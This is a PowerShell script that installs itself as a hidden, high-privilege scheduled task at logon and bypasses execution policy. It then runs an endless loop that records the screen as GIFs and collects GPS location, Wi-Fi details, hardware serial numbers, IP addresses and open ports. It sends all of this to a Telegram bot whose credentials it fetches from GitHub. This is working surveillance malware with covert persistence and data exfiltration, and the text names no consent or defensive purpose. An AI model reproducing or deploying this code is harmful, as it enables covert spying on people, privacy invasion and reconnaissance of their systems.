param(
    [switch]$background
)

# ====================================================
# If not in background mode, install the scheduled task and exit
# ====================================================
if (-not $background) {
    $taskName = "ScreenCaptureTelegramBot"
    
    # Resolve full script path
    try {
        $scriptPath = (Resolve-Path $MyInvocation.MyCommand.Definition).Path
    }
    catch {
        Write-Error "Unable to resolve script path. Exiting."
        exit
    }
    
    # Build the command that the scheduled task will run (with escaped quotes)
    $taskCommand = "PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -background"
    
    Write-Output "Installing scheduled task '$taskName'..."
    
    # Delete any existing task with the same name
    schtasks.exe /delete /tn $taskName /f | Out-Null

    # Create the scheduled task to run at logon with highest privileges
    $createTaskOutput = schtasks.exe /create /tn $taskName /tr $taskCommand /sc onlogon /rl HIGHEST /f
    if ($LASTEXITCODE -eq 0) {
        Write-Output "Scheduled task '$taskName' installed successfully."
        # Optionally start the task immediately
        schtasks.exe /run /tn $taskName | Out-Null
    }
    else {
        Write-Error "Failed to install scheduled task. Output: $createTaskOutput"
    }
    exit
}

# ====================================================
# Background Mode: Main Functionality
# ====================================================
Write-Output "Running in background mode. Starting main loop..."

# Ensure temporary folder exists
if (-not (Test-Path "C:\Temp")) {
    try {
        New-Item -ItemType Directory -Path "C:\Temp" | Out-Null
    }
    catch {
        Write-Error "Cannot create C:\Temp folder. Exiting."
        exit
    }
}

# --------------------
# Enable DPI Awareness (for high DPI screens)
# --------------------
Add-Type -MemberDefinition @"
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
"@ -Name NativeMethods -Namespace MyNamespace
[MyNamespace.NativeMethods]::SetProcessDPIAware() | Out-Null

# --------------------
# Retrieve Credentials from Remote Source
# --------------------
$credUrl = "https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/refs/heads/main/src/cred.dat"
try {
    $CredJson = (Invoke-WebRequest -Uri $credUrl -UseBasicParsing -ErrorAction Stop).Content
    $Cred = $CredJson | ConvertFrom-Json
}
catch {
    Write-Error "Failed to retrieve credentials: $_"
    exit
}

# --------------------
# Function: Decrypt-Credential (returns plain text if not encrypted)
# --------------------
function Decrypt-Credential {
    param ([string]$EncryptedString)
    if ($EncryptedString -match '^01000000') {
        try {
            $secure = ConvertTo-SecureString $EncryptedString -ErrorAction Stop
            $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
            $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
            [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
            return $plain
        }
        catch {
            return $EncryptedString
        }
    }
    else {
        return $EncryptedString
    }
}

$BotToken = Decrypt-Credential -EncryptedString $Cred.BotToken
$ChatID   = Decrypt-Credential -EncryptedString $Cred.ChatID

# --------------------
# Function: Capture-Frame (screenshot as a BitmapSource)
# --------------------
function Capture-Frame {
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing, PresentationCore

    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $graphics.Dispose()

    $hBitmap = $bmp.GetHbitmap()
    $bitmapSource = [System.Windows.Interop.Imaging]::CreateBitmapSourceFromHBitmap(
        $hBitmap,
        [IntPtr]::Zero,
        [System.Windows.Int32Rect]::new(0, 0, $bmp.Width, $bmp.Height),
        [System.Windows.Media.Imaging.BitmapSizeOptions]::FromEmptyOptions()
    )
    Add-Type -MemberDefinition @"
    [DllImport("gdi32.dll")]
    public static extern bool DeleteObject(IntPtr hObject);
"@ -Name GDI32 -Namespace Win32
    [Win32.GDI32]::DeleteObject($hBitmap) | Out-Null
    $bmp.Dispose()
    return $bitmapSource
}

# --------------------
# Function: Capture-AnimatedGIF (captures a screen GIF)
# --------------------
function Capture-AnimatedGIF {
    param(
        [int]$durationSeconds = 10,
        [int]$framesPerSecond = 3
    )
    Add-Type -AssemblyName PresentationCore

    $encoder = New-Object System.Windows.Media.Imaging.GifBitmapEncoder
    $totalFrames = [Math]::Ceiling($durationSeconds * $framesPerSecond)
    $frameInterval = 1 / $framesPerSecond

    for ($i = 0; $i -lt $totalFrames; $i++) {
        $frame = Capture-Frame
        $encoder.Frames.Add([System.Windows.Media.Imaging.BitmapFrame]::Create($frame))
        Start-Sleep -Seconds $frameInterval
    }
    $gifPath = "C:\Temp\screenrecord.gif"
    $fs = [System.IO.File]::Open($gifPath, [System.IO.FileMode]::Create)
    $encoder.Save($fs)
    $fs.Close()
    return $gifPath
}

# --------------------
# Function: Send-TelegramAnimation (sends the GIF via Telegram API)
# --------------------
function Send-TelegramAnimation {
    param (
        [string]$GifPath
    )
    
    $Uri = "https://api.telegram.org/bot$BotToken/sendAnimation"
    $Boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
    $LF = "`r`n"
    $ms = New-Object System.IO.MemoryStream

    $chatIdHeader = "--$Boundary$LF" +
                    'Content-Disposition: form-data; name="chat_id"' + $LF + $LF +
                    $ChatID + $LF
    $chatIdHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($chatIdHeader)
    $ms.Write($chatIdHeaderBytes, 0, $chatIdHeaderBytes.Length)
    
    $fileBytes = [System.IO.File]::ReadAllBytes($GifPath)
    $fileHeader = "--$Boundary$LF" +
                  'Content-Disposition: form-data; name="animation"; filename="' + (Split-Path $GifPath -Leaf) + '"' + $LF +
                  "Content-Type: image/gif$LF$LF"
    $fileHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($fileHeader)
    $ms.Write($fileHeaderBytes, 0, $fileHeaderBytes.Length)
    $ms.Write($fileBytes, 0, $fileBytes.Length)
    
    $ending = "$LF--$Boundary--$LF"
    $endingBytes = [System.Text.Encoding]::UTF8.GetBytes($ending)
    $ms.Write($endingBytes, 0, $endingBytes.Length)
    
    $ms.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $ContentBytes = $ms.ToArray()
    
    $WebRequest = [System.Net.HttpWebRequest]::Create($Uri)
    $WebRequest.Method = "POST"
    $WebRequest.ContentType = "multipart/form-data; boundary=$Boundary"
    $WebRequest.ContentLength = $ContentBytes.Length
    
    $Stream = $WebRequest.GetRequestStream()
    $Stream.Write($ContentBytes, 0, $ContentBytes.Length)
    $Stream.Close()
    
    try {
        $Response = $WebRequest.GetResponse()
        $ResponseStream = $Response.GetResponseStream()
        $Reader = New-Object System.IO.StreamReader($ResponseStream)
        $null = $Reader.ReadToEnd() | Out-Null
        $Reader.Close()
        $ResponseStream.Close()
        $Response.Close()
    }
    catch {
        Write-Error "Error sending Telegram animation: $_"
    }
}

# --------------------
# Function: Send-TelegramMessage (sends a text message)
# --------------------
function Send-TelegramMessage {
    param (
        [string]$Message
    )
    $Uri = "https://api.telegram.org/bot$BotToken/sendMessage"
    $Body = @{
        chat_id = $ChatID
        text    = $Message
    }
    try {
        Invoke-RestMethod -Uri $Uri -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json) | Out-Null
    }
    catch {
        Write-Error "Error sending Telegram message: $_"
    }
}

# --------------------
# Function: Get-WindowsGeolocation (retrieves GPS info)
# --------------------
Add-Type -AssemblyName System.Device
function Get-WindowsGeolocation {
    $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $watcher.Start()
    $timeout = 30
    while ($watcher.Status -ne 'Ready' -and $timeout -gt 0) {
        Start-Sleep -Milliseconds 100
        $timeout--
    }
    if ($watcher.Position.Location.IsUnknown) {
        return $null
    }
    return @{
        Latitude  = $watcher.Position.Location.Latitude
        Longitude = $watcher.Position.Location.Longitude
        Accuracy  = $watcher.Position.Location.HorizontalAccuracy
    }
}

# --------------------
# Function: Get-CompleteSystemInfo (collects system & network info)
# --------------------
function Get-CompleteSystemInfo {
    $computerName = $env:COMPUTERNAME
    $osInstance = Get-CimInstance Win32_OperatingSystem
    $osInfo = "$($osInstance.Caption) (Version: $($osInstance.Version))"
    $dateTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

    $basicInfo = "=== Basic System Information ===`nComputer Name: $computerName`nOS: $osInfo`nDate/Time: $dateTime`n"

    try {
        $wifiOutput = netsh wlan show interfaces | Out-String
        $ssid   = ($wifiOutput | Select-String "^\s*SSID\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
        $signal = ($wifiOutput | Select-String "^\s*Signal\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
        if (-not $ssid) { $ssid = "N/A" }
        if (-not $signal) { $signal = "N/A" }
    }
    catch {
        $ssid = "N/A"
        $signal = "N/A"
    }
    $wifiInfo = "WiFi SSID: $ssid`nWiFi Signal: $signal`n"

    $geo = Get-WindowsGeolocation
    if ($geo) {
        $locationInfo = "Latitude: $($geo.Latitude), Longitude: $($geo.Longitude) (Accuracy: $($geo.Accuracy) m)"
    }
    else {
        $locationInfo = "Location unavailable. Ensure Location Services are enabled."
    }
    $locationSection = "GPS Location: $locationInfo`n"

    $cs = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Manufacturer, Model
    $csp = Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object Name, Version, IdentifyingNumber, UUID, Vendor
    $bios = Get-CimInstance -ClassName Win32_BIOS | Select-Object SerialNumber, Version, ReleaseDate
    $enclosure = Get-CimInstance -ClassName Win32_SystemEnclosure | Select-Object SerialNumber, ChassisTypes

    $systemInfoSection = "=== Detailed System Information ===`nManufacturer: $($cs.Manufacturer)`nModel: $($cs.Model)`nMTM: $($csp.Name)`n"
    if ($csp.Version) { $systemInfoSection += "Product Version: $($csp.Version)`n" }
    $biosSection = "`nBIOS Information:`n  Serial Number: $($bios.SerialNumber)`n  BIOS Version: $($bios.Version)`n  Release Date: $($bios.ReleaseDate)`n"
    $enclosureSection = "`nSystem Enclosure:`n  Serial Number: $($enclosure.SerialNumber)`n  Chassis Type: $($enclosure.ChassisTypes)`n"
    $productSection = "`nProduct Information:`n  SN: $($csp.IdentifyingNumber)`n  UUID: $($csp.UUID)`n  Vendor: $($csp.Vendor)`n"

    $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | 
                   Where-Object { $_.PrefixOrigin -ne 'WellKnown' -and $_.IPAddress -notlike '127.*' } |
                   Select-Object InterfaceAlias, IPAddress, PrefixLength
    $ipInfo = "`n=== Network Information ===`nIP Addresses:`n"
    foreach ($ip in $ipAddresses) {
        $ipInfo += "Interface: $($ip.InterfaceAlias) - IP: $($ip.IPAddress)/$($ip.PrefixLength)`n"
    }

    try {
        $wifiAdapter = Get-NetAdapter -ErrorAction Stop | Where-Object { $_.MediaType -eq 'Native 802.11' -and $_.Status -eq 'Up' }
        if ($wifiAdapter) {
            $wifiDetails = netsh wlan show interfaces | Out-String
            $bssid = ($wifiDetails | Select-String 'BSSID').Line -replace '.*BSSID\s*:\s*',''
            $essid = ($wifiDetails | Select-String 'SSID').Line.Split(':')[1].Trim()
            $wifiSection = "`nWiFi Details:`nESSID: $essid`nBSSID: $bssid`n"
        }
        else {
            $wifiSection = "`nNo active WiFi interface found.`n"
        }
    }
    catch {
        $wifiSection = "`nError retrieving WiFi details.`n"
    }

    try {
        $listeningPorts = Get-NetTCPConnection -State Listen | 
                          Where-Object { $_.LocalAddress -ne '127.0.0.1' } |
                          Select-Object LocalAddress, LocalPort, @{Name='Process'; Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}}, OwningProcess
        $portsSection = "`nOpen Ports:`n"
        foreach ($port in $listeningPorts) {
            $portsSection += "IP: $($port.LocalAddress) Port: $($port.LocalPort) Process: $($port.Process)`n"
        }
    }
    catch {
        $portsSection = "`nError retrieving open ports.`n"
    }

    $adapters = Get-NetAdapter | Where-Object Status -eq 'Up'
    $adaptersSection = "`nNetwork Adapters:`n"
    foreach ($adapter in $adapters) {
        $adaptersSection += "Name: $($adapter.Name) - $($adapter.InterfaceDescription) - Speed: $($adapter.LinkSpeed)`n"
    }

    $defaultGateway = Get-NetRoute -AddressFamily IPv4 | Where-Object DestinationPrefix -eq '0.0.0.0/0'
    $gatewaySection = "`nDefault Gateway:`n"
    foreach ($route in $defaultGateway) {
        $gatewaySection += "NextHop: $($route.NextHop) via $($route.InterfaceAlias)`n"
    }

    return $basicInfo + $wifiInfo + $locationSection + $systemInfoSection + $biosSection + $enclosureSection + $productSection + $ipInfo + $wifiSection + $portsSection + $adaptersSection + $gatewaySection
}

# --------------------
# Main Loop: Capture and send screen recording & system info repeatedly
# --------------------
while ($true) {
    try {
        $gifPath = Capture-AnimatedGIF -durationSeconds 10 -framesPerSecond 3
        Send-TelegramAnimation -GifPath $gifPath
        $systemInfo = Get-CompleteSystemInfo
        Send-TelegramMessage -Message $systemInfo
    }
    catch {
        Write-Error "Error in main loop: $_"
    }
    Start-Sleep -Seconds 2
}
